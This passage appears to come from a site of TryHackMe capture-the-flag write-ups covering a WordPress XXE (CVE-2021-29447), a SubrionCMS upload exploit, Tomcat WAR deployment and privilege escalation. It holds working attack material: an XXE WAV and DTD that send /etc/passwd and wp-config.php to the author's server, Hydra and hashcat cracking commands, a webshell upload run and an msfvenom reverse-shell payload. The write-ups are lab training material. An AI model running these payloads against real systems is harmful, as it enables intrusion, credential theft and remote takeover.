WAV media file that could be uploaded in the WordPress dashboard under the media library section. </p> <p></p> <p>This can be created as follows:</p> <p>payload.wav File Payload</p> <pre><code>echo -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '''''http://10.17.3.217:8000/NAMEEVIL.dtd'''''&gt;%remote;%init;%trick;]&gt;\\x00' &gt; payload.wav\n</code></pre> <p>Once uploaded, I was able to use this file to establish a connection back to my HTTP server and execute an XXE attack by including <code>/etc/passwd</code> without proper validation, thereby accessing sensitive data on the targeted system. For this purpose, I also created a custom file called <code>NAMEEVIL.dtd</code>, which connected to the server and provided content in encoded base64 form.</p> <p>NAMEEVIL.dtd</p> <pre><code>&lt;!ENTITY % file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.17.3.217:8000/?p=%file;'&gt;\" &gt;\n</code></pre> <p></p> <p>By decoding the <code>/etc/passwd</code> file, I was able to successfully exploit the vulnerability.</p> <pre><code>   root:x:0:0:root:/root:/bin/bash\n   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n   bin:x:2:2:bin:/bin:/usr/sbin/nologin\n   sys:x:3:3:sys:/dev:/usr/sbin/nologin\n   sync:x:4:65534:sync:/bin:/bin/sync\n   games:x:5:60:games:/usr/games:/usr/sbin/nologin\n   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n   irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n   systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\n   systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\n   systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\n   systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\n   syslog:x:104:108::/home/syslog:/bin/false\n   _apt:x:105:65534::/nonexistent:/bin/false\n   messagebus:x:106:110::/var/run/dbus:/bin/false\n   uuidd:x:107:111::/run/uuidd:/bin/false\n   REDACTED:x:1000:1000:CVE-2021-29447,,,:/home/REDACTED:/bin/bash\n   sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin\n   mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false\n</code></pre>"},{"location":"easy/CVE-2021-29447/#exploiting-wordpress","title":"Exploiting Wordpress","text":"<p>The next step is to enumerate the WordPress website on port 80 and obtain its <code>wp-config.php</code>. This file meets the requirement of the first objective in the current room. </p> <ul> <li> Use the vulnerability CVE-2021-29447 to read the wordpress configuration file.</li> </ul> <p>By gaining access to the <code>wp-config.php</code> file, I can obtain sensitive data, such as database credentials, that can be used to further penetrate the system. I used same technique as follows by replacing the dtd file with</p> <p><pre><code>&lt;!ENTITY % file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php\"&gt;\n</code></pre> </p> <p>Here is the decoded Base64 file that answers these questions:</p> <ul> <li> what is the name of the database for WordPress? <code>Line 23</code></li> <li> what are the credentials you found? (user:password) <code>Line 26 &amp; 29</code></li> </ul> <pre><code> &lt;?php\n/**\n * The base configuration for WordPress\n *\n * The wp-config.php creation script uses this file during the\n * installation. You don't have to use the web site, you can\n * copy this file to \"wp-config.php\" and fill in the values.\n *\n * This file contains the following configurations:\n *\n * * MySQL settings\n * * Secret keys\n * * Database table prefix\n * * ABSPATH\n *\n * @link https://wordpress.org/support/article/editing-wp-config-php/\n *\n * @package WordPress\n */\n\n// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'REDACTED' );\n/** MySQL database username */\ndefine( 'DB_USER', 'REDACTED' );\n/** MySQL database password */\ndefine( 'DB_PASSWORD', 'REDACTED' );\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database Charset to use in creating database tables. */\ndefine( 'DB_CHARSET', 'utf8' );\n\n/** The Database Collate type. Don't change this if in doubt. */\ndefine( 'DB_COLLATE', '' );\n</code></pre>"},{"location":"easy/CVE-2021-29447/#gaining-admin-account","title":"Gaining ADMIN account","text":"<p>After obtaining the database credentials, I attempted to log in to <code>MySQL</code>, as our scanning process revealed that it was open on port 3306. Upon logging in, I discovered the presence of a <code>REDACTED</code> database that contained usernames and databases. </p> <pre><code>MySQL [(none)]&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n| REDACTED           |\n+--------------------+\n\n\n\nDatabase changed\nMySQL [REDACTED]&gt; show tables;\n+----------------------------+\n| Tables_in_REDACTED         |\n+----------------------------+\n| REDACTED_commentmeta       |\n| REDACTED_comments          |\n| REDACTED_links             |\n| REDACTED_options           |\n| REDACTED_postmeta          |\n| REDACTED_posts             |\n| REDACTED_term_relationships|\n| REDACTED_term_taxonomy     |\n| REDACTED_termmeta          |\n| REDACTED_terms             |\n| REDACTED_usermeta          |\n| REDACTED                   |\n+----------------------------+\n</code></pre> <p>I quickly accessed <code>REDACTED</code> table and retrieved the administrator's username and password. This was crucial, as the current user did not have full access to other WordPress features. With the admin's credentials, I can now carry out more advanced attacks to gain shell.</p> <p>One of the row in REDACTED table</p> <pre><code>|  1 | corp-001   | REDACTED | corp-001      | corp-001@fakemail.com      \n</code></pre> <p>I investigated further to know about its hash-type and learnt that is was 'phpass', and I cracked it through hashcat.</p> <p>Cracking Password</p> <pre><code>  hashcat -a 0 -m 400 'REDACTED' ~/rockyou.txt\n\n  REDACTED:REDACTED  \n</code></pre> <p>This section answered the following questions:</p> <ul> <li> Enumerate and identify what is the dbms installed on the server? <code>MySQL</code></li> <li> what is the dbms version installed on the server? <code>REDACTED</code></li> <li> what port is the dbms running on? <code>3306</code></li> <li> What is the encrypted password located in the wordpress  users table with id 1?? <code>REDACTED</code></li> <li> What is the password in plaint text? <code>REDACTED</code></li> </ul>"},{"location":"easy/CVE-2021-29447/#initial-foothold","title":"Initial Foothold","text":"<p>In order to gain shell, I changed the WordPress account to the <code>corp-001</code> admin account and began exploring the plugin feature. Initially, I attempted to perform an Arbitrary File Upload by downloading a vulnerable Gallery Plugin, but unfortunately, my attempts were failed. </p> <p></p> <p>then, I proceeded to deactivate that plugin and attempted to edit one of the php files with my custom PHP reverse shell code. By doing so, I aimed to establish a reverse shell on the system, granting me remote access and control.</p> <p></p> <p>and the last question was answered!</p> <ul> <li> Compromise the machine and locate flag.txt</li> </ul>"},{"location":"easy/Tech_Supp0rt/","title":"Tech_Supp0rt:1","text":"<p>TryHackMe Link</p> <p>Description</p> <p><p></p></p> Tasks: <ul> <li> What is the <code>root.txt</code> flag? </li> </ul>"},{"location":"easy/Tech_Supp0rt/#scanning","title":"Scanning","text":"<ul> <li> <p>Assigned IP address: \u00a0 </p> </li> <li> <p>Open Ports: </p> </li> </ul> <p>PORT</p> <p>SERVICE</p> <p>DESCRIPTION <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Nmap Report:   <pre><code>  # Nmap 7.93 scan initiated Fri Feb 24 22:02:22 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.166.73\nNmap scan report for 10.10.166.73\n  Host is up (0.16s latency).\n  Not shown: 996 closed tcp ports (reset)\nPORT    STATE SERVICE     VERSION\n  22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   2048 108af572d7f97e14a5c54f9e978b3d58 (RSA)\n|   256 7f10f557413c71dbb55bdb75c976305c (ECDSA)\n|_  256 6b4c23506f36007ca67c1173c1a8600c (ED25519)\n80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n  TCP/IP fingerprint:\n  OS:SCAN(V=7.93%E=4%D=2/24%OT=22%CT=1%CU=39978%PV=Y%DS=5%DC=I%G=Y%TM=63F97A6\n  OS:1%P=aarch64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS\n  OS:=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M\n  OS:505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68\nOS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\n  OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\n  OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\n  OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\n  OS:=40%CD=S)\n\nNetwork Distance: 5 hops\n  Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n  Host script results:\n  |_clock-skew: mean: -1h50m00s, deviation: 3h10m31s, median: 0s\n  | smb2-security-mode: |   311: |_    Message signing enabled but not required\n  | smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\n|   Computer name: techsupport\n  |   NetBIOS computer name: TECHSUPPORT\\x00\n|   Domain name: \\x00\n|   FQDN: techsupport\n  |_  System time: 2023-02-25T08:32:50+05:30\n  | smb-security-mode: |   account_used: guest\n  |   authentication_level: user\n  |   challenge_response: supported\n  |_  message_signing: disabled (dangerous, but default)\n| smb2-time: |   date: 2023-02-25T03:02:52\n  |_  start_date: N/A\n\n  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n  # Nmap done at Fri Feb 24 22:02:57 2023 -- 1 IP address (1 host up) scanned in 35.58 seconds\n</code></pre></li> </ul>"},{"location":"easy/Tech_Supp0rt/#enumeration","title":"Enumeration","text":"<p>At first, I accessed to the HTTP port on port 80, which led me to a default Apache webpage. </p> <p></p> <p>Then, I ran dirsearch to perform enumeration of the webserver's hidden directories, which yielded the following results.</p> <pre><code>    Target: http://10.10.166.73/\n    [22:06:17] Starting: [22:06:24] 403 -  278B  - /.ht_wsr.txt                                     [22:06:24] 403 -  278B  - /.htaccess.bak1                                  [22:06:24] 403 -  278B  - /.htaccess.sample\n    [22:06:24] 403 -  278B  - /.htaccess.save\n    [22:06:24] 403 -  278B  - /.htaccess.orig\n    [22:06:24] 403 -  278B  - /.htaccess_sc\n    [22:06:24] 403 -  278B  - /.htaccess_extra\n    [22:06:24] 403 -  278B  - /.htaccess_orig\n    [22:06:24] 403 -  278B  - /.htaccessBAK\n    [22:06:24] 403 -  278B  - /.htaccessOLD\n    [22:06:24] 403 -  278B  - /.htaccessOLD2\n    [22:06:24] 403 -  278B  - /.htm                                            [22:06:24] 403 -  278B  - /.html\n    [22:06:24] 403 -  278B  - /.htpasswds\n    [22:06:24] 403 -  278B  - /.httr-oauth\n    [22:06:24] 403 -  278B  - /.htpasswd_test\n    [22:06:26] 403 -  278B  - /.php                                            [22:06:58] 200 -   11KB - /index.html                                       [22:07:07] 200 -   94KB - /phpinfo.php                                      [22:07:11] 403 -  278B  - /server-status                                    [22:07:11] 403 -  278B  - /server-status/                                   [22:07:15] 301 -  313B  - /test  -&gt;  http://10.10.166.73/test/             [22:07:15] 200 -   20KB - /test/                                            [22:07:19] 200 -    7KB - /wordpress/wp-login.php                           Task Completed  </code></pre> <p>Among the directories, the /test and /wordpress folders appeared to hold potential. Therefore, I explored both directories, one of which contained a suspicious-looking phishing page </p> <p></p> <p>while the other hosted the /wordpress theme featuring Teczilla.</p> <p></p> <p>I enumerated even further with /test folder to find sub-folders. but wasn't lucky. So, I shifted my attention to the SMB protocols and ran smbclient tool to carry out enumeration. I encountered a READ_ONLY drive named <code>websvr</code>.</p> <p>SMB Enumeration</p> <pre><code>smbclient -L //10.10.166.73 \n</code></pre> <pre><code>Password for [WORKGROUP\\kali]:\n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    print$          Disk      Printer Drivers\n    websvr          Disk      \n    IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))\n</code></pre> <p>To access the share, I used the following command:</p> <p></p> <p>Upon accessing the share, I got a text file that contained a hint regarding a hidden CMS folder located on the web server. </p> <pre><code>GOALS\n=====\n1)Make fake popup and host it online on Digital Ocean server\n2)Fix subrion site, /subrion doesn't work, edit from panel\n3)Edit wordpress website\n\nIMP\n===\nSubrion creds\n|-&gt;admin:REDACTED [cooked with magical formula]\nWordpress creds\n|-&gt;\n</code></pre> <p>While navigating to this directory, the page took an exceedingly long time to reload, causing me to lose hope. I decided to intercept the process and investigate what was occurring. To my surprise, the page redirected to a different location. When returning to the hint text file, I noticed that I have to visit /subrion/panel section.</p>"},{"location":"easy/Tech_Supp0rt/#initial-access","title":"Initial Access","text":"<p>Now, I successfully located the CMS website. After determining the version number to be  4.2.1 , I followed best practices by checking the database portal of searchsploit for any potential payloads and exploits. </p> <p></p> <p>I identified a possible RCE attack. Executing the following command led to my initial foothold on the webserver as <code>www-data</code> (a low-hanging fruit).</p> <p>Arbitary File Upload</p> <pre><code>python3 49876.py -u http://10.10.166.73/subrion/panel/ -l admin -p REDACTED\n\n[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 \n\n[+] Trying to connect to: http://10.10.166.73/subrion/panel/\n[+] Success!\n[+] Got CSRF token: LMx7pGnP4TA2tH67fVLEDShClIsmLu4rhKBjbIKY\n[+] Trying to log in...\n[+] Login Successful!\n\n[+] Generating random name for Webshell...\n[+] Generated webshell name: cosqtjuuaaeiyms\n\n[+] Trying to Upload Webshell..\n[+] Upload Success... Webshell path: http://10.10.166.73/subrion/panel/uploads/cosqtjuuaaeiyms.phar \n</code></pre> <p>Password Crack</p> <p>Note: You need to crack the password of admin using the magic function in CyberChef</p>"},{"location":"easy/Tech_Supp0rt/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"easy/Tech_Supp0rt/#gaining-user-access","title":"Gaining User access","text":"<p>To elevate my access privileges, I attempted to establish a reverse shell from this point using the nc command. Unfortunately, my efforts didn't work well, and I was looking other alternatives.</p> <p>At this point, I decided to enumerate the server's users further. I ran <code>/etc/passwd</code> and discovered the usernames.</p> <pre><code>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nsyslog:x:104:108::/home/syslog:/bin/false\n_apt:x:105:65534::/nonexistent:/bin/false\nlxd:x:106:65534::/var/lib/lxd/:/bin/false\nmessagebus:x:107:111::/var/run/dbus:/bin/false\nuuidd:x:108:112::/run/uuidd:/bin/false\ndnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false\nsshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin\nscamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash\nmysql:x:111:119:MySQL Server,,,:/nonexistent:/bin/false\n</code></pre> <p>My attention then shifted to the wordpress directory, where I hoped to find some juicy information. To my delight, I found the database configuration file for Wordpress in the webserver folder.</p> <pre><code>&lt;?php \n/**\n * The base configuration for WordPress\n *\n * The wp-config.php creation script uses this file during the\n * installation. You don't have to use the web site, you can\n * copy this file to \"wp-config.php\" and fill in the values.\n *\n * This file contains the following configurations:\n *\n * * MySQL settings\n * * Secret keys\n * * Database table prefix\n * * ABSPATH\n *\n * @link https://wordpress.org/support/article/editing-wp-config-php/\n *\n * @package WordPress\n */\n\n// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'wpdb' );\n\n/** MySQL database username */\ndefine( 'DB_USER', 'REDACTED' );\n/** MySQL database password */\ndefine( 'DB_PASSWORD', 'REDACTED' );\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database Charset to use in creating database tables. */\ndefine( 'DB_CHARSET', 'utf8' );\n\n/** The Database Collate type. Don't change this if in doubt. */\ndefine( 'DB_COLLATE', '' );\n</code></pre> <p>Pentesting Practice</p> <p>Typically, when you obtain some credentials, it's recommended to attempt to reuse them across all accessible services.</p> <p>By utilizing the obtained password for mysql, I reused to ssh on the <code>scam-site</code> user, and I was able to elevate my privileges.</p>"},{"location":"easy/Tech_Supp0rt/#gaining-root-access","title":"Gaining Root access","text":"<p>From this point, the process became straightforward. I executed linpeas.sh to determine the current user's administrative powers. This was one of the following results:</p> <p></p> <p>I then visited gtfobins to determine if any relevant entries existed. Once I identified the <code>iconv</code>, I executed the sudo command to gain root access.</p>"},{"location":"easy/ToolsRUs/","title":"ToolsRUs","text":"<p>TryHackMe Link</p> <p>Description</p> <p><p></p></p> <p>In this section, I will discuss about gaining access to a system by exploiting vulnerabilities in various services. The services include Apache Tomcat, Apache Coyote JSP Engine, Apache Jserv, and an HTTP server on port 80.</p>"},{"location":"easy/ToolsRUs/#scanning","title":"Scanning","text":"<ul> <li> <p>Assigned IP address: \u00a0 </p> </li> <li> <p>Open Ports: </p> </li> </ul> <p>PORT</p> <p>SERVICE</p> <p>DESCRIPTION <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Nmap Report:   <pre><code>  # Nmap 7.93 scan initiated Wed Feb 22 10:11:28 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.4.144\nNmap scan report for 10.10.4.144\n  Host is up (0.15s latency).\n  Not shown: 996 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n  22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   2048 460e76fbb6a2f7f78536656f8809f7e8 (RSA)\n|   256 a1bc5d3478f4e8d4091805ef9d9072c5 (ECDSA)\n|_  256 0757145539dfc56296f9fc4883cf127e (ED25519)\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n  1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n  |_http-favicon: Apache Tomcat\n  |_http-title: Apache Tomcat/7.0.88\n  |_http-server-header: Apache-Coyote/1.1\n  8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)\n|_ajp-methods: Failed to get a valid response for the OPTION request\n  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n  TCP/IP fingerprint:\n  OS:SCAN(V=7.93%E=4%D=2/22%OT=22%CT=1%CU=33697%PV=Y%DS=5%DC=I%G=Y%TM=63F630B\n  OS:F%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS\n  OS:=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M\n  OS:505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68\nOS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\n  OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\n  OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\n  OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\n  OS:=40%CD=S)\n\nNetwork Distance: 5 hops\n  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n  # Nmap done at Wed Feb 22 10:11:59 2023 -- 1 IP address (1 host up) scanned in 30.78 seconds\n</code></pre></li> </ul>"},{"location":"easy/ToolsRUs/#enumerating-apache-coyote-jsp-engine","title":"Enumerating Apache Coyote JSP Engine","text":"<p>At first, my plan was to exploit the Apache JSP Engine by uploading a malicious WAR file to obtain a shell. Since I was familiar with this method, I felt confident. However, I was unable to pass the authorization process.</p> <p>In my attempts to gain access to the Tomcat Manager, I initially turned to a Python script to brute force default logins for Apache Tomcat. Unfortunately, this approach also failed. </p>"},{"location":"easy/ToolsRUs/#enumerating-the-http-server","title":"Enumerating the HTTP Server","text":"<p>I then shifted my focus to the HTTP server running on port 80, where I discovered a simple page that hinted at the development of the site. </p> <p></p> <p>Utilizing a dirsearch Python script, I was able to locate potentially hidden pages and directories that could provide further clues and entry points.</p> <pre><code>    Target: http://10.10.4.144/\n\n    [10:13:58] Starting: [10:14:03] 403 -  297B  - /.ht_wsr.txt                                     [10:14:03] 403 -  300B  - /.htaccess.bak1\n    [10:14:03] 403 -  302B  - /.htaccess.sample\n    [10:14:03] 403 -  300B  - /.htaccess.orig\n    [10:14:03] 403 -  300B  - /.htaccess.save\n    [10:14:03] 403 -  301B  - /.htaccess_extra\n    [10:14:03] 403 -  300B  - /.htaccess_orig\n    [10:14:03] 403 -  298B  - /.htaccess_sc\n    [10:14:03] 403 -  298B  - /.htaccessBAK\n    [10:14:03] 403 -  298B  - /.htaccessOLD\n    [10:14:03] 403 -  290B  - /.htm\n    [10:14:03] 403 -  299B  - /.htaccessOLD2                                   [10:14:03] 403 -  291B  - /.html\n    [10:14:03] 403 -  300B  - /.htpasswd_test\n    [10:14:03] 403 -  296B  - /.htpasswds\n    [10:14:03] 403 -  297B  - /.httr-oauth\n    [10:14:36] 200 -  168B  - /index.html                                       [10:14:47] 401 -  458B  - /protected/data/                                  [10:14:47] 401 -  458B  - /protected/runtime/\n    [10:14:47] 301 -  298B -  /guidelines\n    [10:14:49] 403 -  299B  - /server-status                                    [10:14:49] 403 -  300B  - /server-status/\n</code></pre>"},{"location":"easy/ToolsRUs/#exploiting-guidelines-page","title":"Exploiting '/guidelines' page","text":"<p>After running the dirsearch script, I was able to identify two promising directories that could lead to further leads, namely <code>protected</code> and <code>guidelines</code>. The former sounded highly secured, but to my surprise, it was not. While I was filling out the question, I decided to check out the <code>/guidelines</code> page, and found a username called <code>bob</code>.</p> <p></p> <p>Leveraging this discovery, I was able to brute force Bob's password using Hydra, which gave me access to the <code>protected</code> directory. It was a simple HTTP Basic Authorization Request which can be brute forced with the following command:</p> <p>Hydra Command</p> <p><p>hydra $IP -l bob -P ~/rockyou.txt http-get /protected -V</p></p> <p></p> <p>I successfully obtained Bob's login credentials, and used them to access the page that I had discovered earlier.</p>"},{"location":"easy/ToolsRUs/#exploiting-apache-tomcat-with-harvested-credentials","title":"Exploiting Apache Tomcat with Harvested Credentials","text":"<p>When I logged in, I discovered that the Authorization mechanism used for the Tomcat Service and the <code>/protected</code> directory were the same. </p> <p></p> <p>This allowed me to reuse the credentials that I had previously harvested. With access granted, I uploaded a Java WAR file to the manager and made a reverse shell from it.</p> <p>Msfvenom Payload</p> <p>msfvenom -p java/shell_reverse_tcp lhost=10.17.3.217 lport=5432 -f war -o shell.war</p> <p></p> <p>Also, I made a listener, before I accessed http://10.10.4.144:1234/shell/ giving me the shell.</p>"},{"location":"easy/ToolsRUs/#gaining-root-access","title":"Gaining Root access","text":"<p>Surprisingly, I was granted <code>root</code> access, rather than the expected <code>www-data</code> shell. Easy-Peasy</p> <pre><code>root@ip-10-10-4-144:/# cat root/*\ncat root/*\nREDACTED\ncat: root/snap: Is a directory\n</code></pre> <p>Peace-out!</p>"},{"location":"easy/colddbox/","title":"ColddBox Easy","text":"<p>TryHackMe Link</p> <p>Description</p> <p><p></p></p> <p>In this CTF, I was able to successfully exploit a WordPress server using a combination of tools and techniques. In this blog post, I will share my experience and provide insights on how I was able to get the initial foothold, escalate my privileges, and finally became root.</p>"},{"location":"easy/colddbox/#scanning","title":"Scanning","text":"<ul> <li> <p>Assigned IP address: \u00a0 </p> </li> <li> <p>Open Ports: </p> </li> </ul> <p>PORT</p> <p>SERVICE</p> <p>DESCRIPTION <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Nmap Report:   <pre><code># Nmap 7.93 scan initiated Mon Feb 20 13:34:05 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.237.179\nNmap scan report for 10.10.237.179\n  Host is up (0.15s latency).\n  Not shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: WordPress 4.1.31\n  |_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: ColddBox | One more machine\n  4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   2048 4ebf98c09bc536808c96e8969565973b (RSA)\n|   256 8817f1a844f7f8062fd34f733298c7c5 (ECDSA)\n|_  256 f2fc6c750820b1b2512d94d694d7514f (ED25519)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n  TCP/IP fingerprint:\n  OS:SCAN(V=7.93%E=4%D=2/20%OT=80%CT=1%CU=42564%PV=Y%DS=5%DC=I%G=Y%TM=63F36FE\n  OS:8%P=aarch64-unknown-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS\n  OS:=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M\n  OS:505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68\nOS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\n  OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\n  OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\n  OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\n  OS:=40%CD=S)\n\nNetwork Distance: 5 hops\n\n  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n  # Nmap done at Mon Feb 20 08:04:40 2023 -- 1 IP address (1 host up) 